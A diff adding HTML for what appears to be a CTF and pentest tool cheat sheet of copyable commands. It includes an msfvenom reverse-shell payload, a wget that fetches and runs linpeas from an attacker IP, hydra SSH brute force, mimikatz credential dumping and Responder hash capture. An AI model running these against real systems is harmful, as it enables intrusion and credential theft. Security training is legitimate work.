+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">theHarvester</span> <span class="f">-d</span> <span class="a">target.com</span> <span class="f">-b google,bing,linkedin -l 500</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card" data-guide="Shodan">
+        <div class="card-hdr"><a href="https://help.shodan.io/command-line-interface/0-installation" target="_blank" class="tool-link">Shodan</a><span class="tag t-web">WEB</span></div>
+        <p class="desc">Search engine for internet-connected devices. Find exposed services, banners, and CVEs by filter.</p>
+        <div class="gui-note" onclick="openGuide('Shodan')">
+          <span class="expand-hint">▶ Click for step-by-step guide</span>port:22 country:TN → SSH in Tunisia
+hostname:target.com → by hostname
+shodan host 1.2.3.4 → CLI lookup</div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ WEB EXPLOITATION -->
+  <section id="web-exploit">
+    <div class="sec-hdr"><span>🧪</span><h2>Web Exploitation</h2><span class="sec-count">3 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card" data-guide="Burp Suite">
+        <div class="card-hdr"><a href="https://portswigger.net/burp/documentation/desktop" target="_blank" class="tool-link">Burp Suite</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Industry-standard proxy for intercepting, modifying, and replaying HTTP traffic. Core of web app pentesting.</p>
+        <div class="gui-note" onclick="openGuide('Burp Suite')">
+          <span class="expand-hint">▶ Click for step-by-step guide</span>Proxy → Intercept: capture browser requests
+Repeater: manually modify and resend requests
+Intruder: fuzzing and brute-force (rate-limited in free)</div>
+      </div>
+
+      <div class="tool-card" data-guide="OWASP ZAP">
+        <div class="card-hdr"><a href="https://www.zaproxy.org/docs/" target="_blank" class="tool-link">OWASP ZAP</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Free open-source Burp alternative. Active/passive scanning with no brute-force rate limits.</p>
+        <div class="gui-note" onclick="openGuide('OWASP ZAP')">
+          <span class="expand-hint">▶ Click for step-by-step guide</span>Spider: crawl and map site structure
+Active Scan: automated vulnerability detection
+Fuzzer: test parameters with payload lists</div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" class="tool-link">sqlmap</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Automates detection and exploitation of SQL injection. Can dump databases, read files, and run OS commands.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">sqlmap</span> <span class="f">-u</span> <span class="s">"http://site.com/page?id=1"</span> <span class="f">--dbs --batch --random-agent</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ BRUTE FORCE -->
+  <section id="brute">
+    <div class="sec-hdr"><span>🔐</span><h2>Brute Force & Auth</h2><span class="sec-count">2 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.kali.org/tools/hydra/" target="_blank" class="tool-link">Hydra</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Fast online password cracker supporting 50+ protocols: SSH, FTP, HTTP, SMB, RDP, MySQL and more.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">hydra</span> <span class="f">-l admin -P</span> <span class="a">rockyou.txt</span> <span class="f">-t 4</span> <span class="a">ssh://10.10.10.10</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.kali.org/tools/medusa/" target="_blank" class="tool-link">medusa</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Speedy parallel login cracker with modular protocol support. Good Hydra alternative for FTP and IMAP.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">medusa</span> <span class="f">-h</span> <span class="a">10.10.10.10</span> <span class="f">-u admin -P</span> <span class="a">rockyou.txt</span> <span class="f">-M ssh -t 4 -f</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ PASSWORD CRACKING -->
+  <section id="pw">
+    <div class="sec-hdr"><span>🔑</span><h2>Password Cracking & Wordlists</h2><span class="sec-count">4 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.openwall.com/john/doc/" target="_blank" class="tool-link">John the Ripper</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Versatile offline hash cracker. Auto-detects hash type. Includes ssh2john, zip2john helper scripts.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">john</span> <span class="f">--wordlist=</span><span class="a">/usr/share/wordlists/rockyou.txt</span> <span class="a">hash.txt</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://hashcat.net/wiki/" target="_blank" class="tool-link">hashcat</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">World's fastest GPU-accelerated password cracker. Supports 350+ hash types and many attack modes.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">hashcat</span> <span class="f">-m 0 -a 0</span> <span class="a">hashes.txt /usr/share/wordlists/rockyou.txt</span> <span class="f">--show</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/digininja/CeWL#usage" target="_blank" class="tool-link">CeWL</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Spiders a website and extracts unique words as a targeted password wordlist for that specific organisation.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">cewl</span> <span class="a">http://site.com</span> <span class="f">-d 2 -m 5 -w</span> <span class="a">wordlist.txt</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.kali.org/tools/crunch/" target="_blank" class="tool-link">crunch</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Generates wordlists from a character set with min/max length. Useful when the password structure is known.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">crunch</span> <span class="a">8 8</span> <span class="f">-t</span> <span class="s">Admin@@@@</span> <span class="f">-o</span> <span class="a">wordlist.txt</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ EXPLOIT FRAMEWORKS -->
+  <section id="exploit-fw">
+    <div class="sec-hdr"><span>💥</span><h2>Exploit Frameworks</h2><span class="sec-count">3 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://docs.metasploit.com/" target="_blank" class="tool-link">Metasploit</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">The most widely used pentesting framework. Contains exploits, payloads, encoders, and post-exploitation modules.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">msfconsole</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html" target="_blank" class="tool-link">msfvenom</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Payload generator from the Metasploit project. Creates standalone malicious files in many formats.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">msfvenom</span> <span class="f">-p windows/x64/shell_reverse_tcp LHOST=</span><span class="a">10.9.0.1</span> <span class="f">LPORT=4444 -f exe -o</span> <span class="a">shell.exe</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.exploit-db.com/searchsploit" target="_blank" class="tool-link">searchsploit</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Offline Exploit-DB search tool. Find public exploits by software name and version without internet access.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">searchsploit</span> <span class="f">-x</span> <span class="a">apache 2.4</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ SHELLS -->
+  <section id="shells">
+    <div class="sec-hdr"><span>🐚</span><h2>Shells & Listeners</h2><span class="sec-count">5 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/nc" target="_blank" class="tool-link">netcat (nc)</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">The networking Swiss Army Knife. Used for reverse shell listeners, bind shells, and file transfers in nearly every THM room.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">nc</span> <span class="f">-lvnp 4444</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/socat" target="_blank" class="tool-link">socat</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Advanced netcat alternative with SSL, IPv6, and bidirectional streams. Creates fully stable TTY shells.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">socat</span> <span class="f">TCP-L:4444 FILE:`tty`,raw,echo=0</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/hanslub42/rlwrap#readme" target="_blank" class="tool-link">rlwrap</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Adds readline history and arrow-key support to any program. Makes raw nc shells on Windows usable.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">rlwrap</span> <span class="a">nc -lvnp 4444</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://man7.org/linux/man-pages/man1/tmux.1.html" target="_blank" class="tool-link">tmux</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Terminal multiplexer. Split panes, persist sessions after disconnect, and multi-task during pentests.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">tmux new -s</span> <span class="a">pentest</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://nmap.org/ncat/guide/index.html" target="_blank" class="tool-link">ncat</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Nmap's improved netcat with SSL encryption and IPv6 support. Better for encrypted shell communication.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">ncat</span> <span class="f">--ssl -lvnp 4444</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ WINDOWS & AD -->
+  <section id="windows">
+    <div class="sec-hdr"><span>🪟</span><h2>Windows & Active Directory</h2><span class="sec-count">8 tools</span></div>
+    <div class="grid">
+
+            <div class="tool-card">
+        <div class="card-hdr"><a href="https://learn.microsoft.com/en-us/powershell/scripting/overview" target="_blank" class="tool-link">PowerShell</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Object-oriented Windows scripting shell. Used for enumeration, file transfers, and running post-exploitation scripts.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">Get-NetUser</span>
+<span class="b">Find-LocalAdminAccess</span>
+<span class="b">Get-NetGroup</span> <span class="f">-GroupName</span> <span class="s">"Domain Admins"</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank" class="tool-link">mimikatz</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Dumps plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory on Windows systems.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">privilege::debug</span>
+<span class="b">sekurlsa::logonpasswords</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card" data-guide="BloodHound">
+        <div class="card-hdr"><a href="https://github.com/SpecterOps/BloodHound/wiki" target="_blank" class="tool-link">BloodHound</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Visualizes Active Directory attack paths using graph theory. Finds the shortest route to Domain Admin.</p>
+        <div class="gui-note" onclick="openGuide('BloodHound')">
+          <span class="expand-hint">▶ Click for step-by-step guide</span>Run SharpHound.exe -c All on target
+Import ZIP into BloodHound GUI
+Run: "Shortest Paths to Domain Admins"</div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" class="tool-link">PowerView</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">PowerShell script to enumerate Active Directory: users, groups, GPOs, shares, and trust relationships.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">Get-NetUser</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.kali.org/tools/enum4linux/" target="_blank" class="tool-link">enum4linux</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Enumerates Windows/Samba hosts for users, shares, groups, and password policies via SMB null sessions.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">enum4linux</span> <span class="f">-a</span> <span class="a">10.10.10.10</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html" target="_blank" class="tool-link">smbclient</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">FTP-like CLI for SMB shares. Lists shares and allows browsing and downloading files from Windows servers.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">smbclient</span> <span class="f">-L //</span><span class="a">10.10.10.10</span> <span class="f">-N</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/lgandx/Responder#readme" target="_blank" class="tool-link">Responder</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Poisons LLMNR, NBT-NS, and MDNS broadcasts to capture NTLMv2 hashes on the local network.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">responder</span> <span class="f">-I eth0 -rdwv</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ LINUX UTILITIES -->
+  <section id="linux">
+    <div class="sec-hdr"><span>🐧</span><h2>Linux OS Utilities</h2><span class="sec-count">5 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/ls" target="_blank" class="tool-link">ls / cd / find / cat</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Core filesystem navigation covered in THM Linux Fundamentals. Non-negotiable basics for any Linux work.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">ls</span> <span class="f">-la</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/grep" target="_blank" class="tool-link">grep / cut / awk / sed</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Text processing power tools. Used constantly to parse tool output and log files.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">grep</span> <span class="f">-r</span> <span class="s">"password"</span> <span class="a">.</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/chmod" target="_blank" class="tool-link">chmod / chown / sudo</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Linux permission management. Used when setting up scripts and for privilege escalation checks.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">chmod +x</span> <span class="a">script.sh</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/tar" target="_blank" class="tool-link">tar / gzip / zip</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Archiving and compression utilities. Common in CTFs for handling evidence files and moving loot.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">tar</span> <span class="f">-xf</span> <span class="a">archive.tar.gz</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/base64" target="_blank" class="tool-link">base64 / md5sum / sha256sum</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Encoding and hashing utilities. Used to decode CTF hints and verify file integrity.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">echo</span> <span class="s">"aGVsbG8="</span> <span class="p">|</span> <span class="b">base64 -d</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ PRIVILEGE ESCALATION -->
+  <section id="privesc">
+    <div class="sec-hdr"><span>⬆️</span><h2>Privilege Escalation</h2><span class="sec-count">3 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" class="tool-link">linpeas</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Linux Privilege Escalation Awesome Script. Automatically finds misconfigs, SUID files, cron jobs, and writable paths.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">wget</span> <span class="a">http://10.9.0.1:8000/linpeas.sh</span> <span class="f">-O /tmp/linpeas.sh</span>
+<span class="b">chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank" class="tool-link">winpeas</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Windows equivalent of linpeas. Finds unquoted service paths, weak permissions, and autologon credentials.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">.\winpeas.exe</span> <span class="f">quiet</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.kali.org/tools/impacket/" target="_blank" class="tool-link">Impacket</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Python toolkit for Windows network protocols. Remote execution, hash dumping, and Kerberos attacks via SMB/NTLM.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">psexec.py</span> <span class="a">admin:admin@10.10.10.10</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ FORENSICS -->
+  <section id="forensics">
+    <div class="sec-hdr"><span>📁</span><h2>Forensics & Steganography</h2><span class="sec-count">8 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://exiftool.org/exiftool_pod.html" target="_blank" class="tool-link">exiftool</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Reads and writes metadata in JPEG, PDF, DOCX, MP3. Extracts GPS, author, camera info, and creation dates.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">exiftool</span> <span class="f">-all=</span> <span class="a">image.jpg</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/strings" target="_blank" class="tool-link">strings</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Extracts printable ASCII/Unicode strings from binary files. First step in any CTF binary challenge.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">strings</span> <span class="f">-n 8</span> <span class="a">binary.exe</span> <span class="p">|</span> <span class="b">grep</span> <span class="f">-i</span> <span class="s">"THM{"</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/file" target="_blank" class="tool-link">file</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Identifies true file type by inspecting magic bytes. Essential when files are disguised with a wrong extension.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">file</span> <span class="a">*</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/xxd" target="_blank" class="tool-link">xxd / hexdump</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Creates hex dumps of files. Used to inspect file headers, identify file types, and spot hidden data.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">xxd</span> <span class="a">file.bin</span> <span class="p">| head -30</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/ReFirmLabs/binwalk/blob/master/README.md" target="_blank" class="tool-link">binwalk</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Scans binaries for embedded files and firmware. Extracts hidden images, archives, or firmware blobs automatically.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">binwalk</span> <span class="f">-e</span> <span class="a">file.bin</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.kali.org/tools/steghide/" target="_blank" class="tool-link">steghide</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Embeds or extracts hidden data in JPEG, BMP, and WAV files. Common in THM CTF steganography challenges.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">steghide</span> <span class="f">extract -sf</span> <span class="a">image.jpg</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/pdfinfo" target="_blank" class="tool-link">pdfinfo</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Extracts metadata from PDF files including title, author, creator, dates, and encryption status.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">pdfinfo</span> <span class="a">document.pdf</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://volatility3.readthedocs.io/en/latest/" target="_blank" class="tool-link">Volatility3</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Leading memory forensics framework. Analyzes RAM dumps for processes, network connections, and injected shellcode. v3 drops --profile — symbol tables auto-detected.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">python3 vol.py</span> <span class="f">-f</span> <span class="a">memory.raw</span> <span class="f">windows.pslist</span>
+<span class="b">python3 vol.py</span> <span class="f">-f</span> <span class="a">memory.raw</span> <span class="f">windows.netscan</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ MALWARE & RE -->
+  <section id="malware">
+    <div class="sec-hdr"><span>🔬</span><h2>Malware Analysis & Reverse Engineering</h2><span class="sec-count">3 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card" data-guide="Ghidra">
+        <div class="card-hdr"><a href="https://github.com/NationalSecurityAgency/ghidra/blob/stable/GhidraDocs/CheatSheet.html" target="_blank" class="tool-link">Ghidra</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">NSA's open-source reverse engineering suite. Decompiles binaries to C-like pseudocode. Supports x86, ARM, MIPS and more.</p>
+        <div class="gui-note" onclick="openGuide('Ghidra')">
+          <span class="expand-hint">▶ Click for step-by-step guide</span>File → Import → Auto-analysis → OK
+Symbol Tree → Functions → double-click main
+Decompiler pane (right): C pseudocode</div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://book.rada.re/first_steps/commandline_flags.html" target="_blank" class="tool-link">radare2</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Powerful open-source reverse engineering framework, hex editor, and debugger across many architectures.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">r2</span> <span class="f">-A</span> <span class="a">binary</span>
+<span class="f">pdf @main</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://yara.readthedocs.io/en/stable/commandline.html" target="_blank" class="tool-link">YARA</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Pattern-matching tool for malware identification. Write rules with string conditions to classify threats.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">yara</span> <span class="f">-r -s</span> <span class="a">rules.yar /suspicious/dir/</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- ═══════════════════════════════════ STATIC ANALYSIS & PE TOOLS -->
+  <section id="static">
+    <div class="sec-hdr"><span>🧩</span><h2>Static Analysis & PE Tools</h2><span class="sec-count">6 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card" data-guide="x64dbg">
+        <div class="card-hdr"><a href="https://help.x64dbg.com/en/latest/" target="_blank" class="tool-link">x64dbg</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Open-source Windows debugger for 32/64-bit binaries. The standard for dynamic malware analysis. Plugins, scripting, conditional breakpoints. Free alternative to OllyDbg.</p>
+        <div class="gui-note" onclick="openGuide('x64dbg')"><span class="expand-hint">&#9658; Click for step-by-step guide</span>File &rarr; Open &rarr; target EXE
+F9 Run / F2 Breakpoint / F7 Step Into
+Right-click &rarr; Follow in Dump</div>
+      </div>
+
+            <div class="tool-card" data-guide="Binary Ninja">
+        <div class="card-hdr"><a href="https://docs.binary.ninja/" target="_blank" class="tool-link">Binary Ninja</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Commercial RE platform with HLIL/MLIL intermediate representations and a powerful Python API. Clean UI, strong scripting, and a free cloud version at binary.ninja/cloud.</p>
+        <div class="gui-note" onclick="openGuide('Binary Ninja')"><span class="expand-hint">&#9658; Click for step-by-step guide</span>File &rarr; Open &rarr; binary
+View &rarr; High Level IL for pseudocode
+N to rename / Ctrl+F to search functions</div>
+      </div>
+
+            <div class="tool-card" data-guide="CFF Explorer">
+        <div class="card-hdr"><a href="https://ntcore.com/explorer-suite/" target="_blank" class="tool-link">CFF Explorer</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">PE file editor from NTCore. Inspects and edits PE headers, sections, imports, exports, and resources. Part of the free Explorer Suite — widely used in CTFs and malware RE.</p>
+        <div class="gui-note" onclick="openGuide('CFF Explorer')"><span class="expand-hint">&#9658; Click for step-by-step guide</span>Open PE &rarr; Import Directory &rarr; inspect DLLs
+Section Headers &rarr; check .text/.data/.rsrc
+NT Headers &rarr; view entry point, image base</div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/avast/retdec/wiki" target="_blank" class="tool-link">RetDec</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Avast&apos;s open-source decompiler. Converts PE, ELF, and COFF binaries to C pseudocode. Supports x86, x64, ARM, MIPS. Useful as a second opinion alongside Ghidra.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">retdec-decompiler</span> <span class="a">malware.exe</span>
+<span class="b">cat</span> <span class="a">malware.c</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card" data-guide="DIE">
+        <div class="card-hdr"><a href="https://github.com/horsicq/Detect-It-Easy#readme" target="_blank" class="tool-link">DIE (Detect-It-Easy)</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Identifies file types, packers, compilers, linkers, and protectors. Supports scripting for custom signatures. More accurate and actively maintained than PEiD.</p>
+        <div class="gui-note" onclick="openGuide('DIE')"><span class="expand-hint">&#9658; Click for step-by-step guide</span>Open file &rarr; packer/compiler detected instantly
+Entropy tab &rarr; high entropy = packed/encrypted
+Strings tab &rarr; search embedded text</div>
+      </div>
+
+      <div class="tool-card" data-guide="HxD">
+        <div class="card-hdr"><a href="https://mh-nexus.de/en/hxd/" target="_blank" class="tool-link">HxD</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Fast Windows hex editor for inspecting and patching raw binary files. Supports disk sector editing, RAM editing, and comparing files side by side.</p>
+        <div class="gui-note" onclick="openGuide('HxD')"><span class="expand-hint">&#9658; Click for step-by-step guide</span>File &rarr; Open &rarr; any binary
+Ctrl+F &rarr; search hex bytes or ASCII strings
+Edit &rarr; Overwrite bytes to patch values</div>
+      </div>
+
+                                  </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ LIVE ANALYSIS & IR -->
+  <section id="liveir">
+    <div class="sec-hdr"><span>&#128301;</span><h2>Live Analysis &amp; Incident Response</h2><span class="sec-count">5 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card" data-guide="Process Hacker">
+        <div class="card-hdr"><a href="https://github.com/processhacker/processhacker/wiki" target="_blank" class="tool-link">Process Hacker</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Advanced Windows task manager showing processes, DLLs, handles, network connections, and memory maps. Detects hidden processes and injected code that Task Manager misses.</p>
+        <div class="gui-note" onclick="openGuide('Process Hacker')"><span class="expand-hint">&#9658; Click for step-by-step guide</span>Run as Admin &rarr; view all processes + PIDs
+Right-click process &rarr; Properties &rarr; Memory
+Network tab &rarr; live connections per process</div>
+      </div>
+
+      <div class="tool-card" data-guide="Process Explorer">
+        <div class="card-hdr"><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" class="tool-link">Process Explorer</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Sysinternals tool showing a detailed process tree with parent/child relationships, DLLs, handles, and VirusTotal integration for quick malware triage on live Windows systems.</p>
+        <div class="gui-note" onclick="openGuide('Process Explorer')"><span class="expand-hint">&#9658; Click for step-by-step guide</span>Run procexp.exe as Admin
+Options &rarr; VirusTotal.com &rarr; Check VirusTotal
+Find &rarr; Find Handle or DLL (Ctrl+F)</div>
+      </div>
+
+      <div class="tool-card" data-guide="Process Monitor">
+        <div class="card-hdr"><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" class="tool-link">Process Monitor</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Sysinternals real-time file system, registry, and network activity monitor. Captures every system call. The definitive tool for behavioral malware analysis on live Windows.</p>
